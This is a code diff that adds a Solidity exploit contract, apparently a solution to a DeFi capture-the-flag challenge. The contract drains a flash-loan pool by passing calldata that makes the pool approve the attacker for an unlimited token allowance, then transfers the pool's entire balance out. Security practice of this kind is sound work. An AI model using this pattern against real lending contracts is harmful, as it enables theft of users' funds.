@@ -40,3 +40,21 @@ contract TrusterLenderPool is ReentrancyGuard {
     }
 
 }
+
+contract TrustAttack {
+
+    uint256 constant public MAX_NUMBER = 115792089237316195423570985008687907853269984665640564039457584007913129639935; 
+
+    function attack(address _pool, address _token) external {
+        TrusterLenderPool pool = TrusterLenderPool(_pool); 
+        IERC20 token = IERC20(_token); 
+
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)",address(this), MAX_NUMBER);
+
+        pool.flashLoan(0, msg.sender, _token, data); 
+
+        token.transferFrom(_pool, msg.sender, token.balanceOf(_pool)); 
+
+    }
+
+}
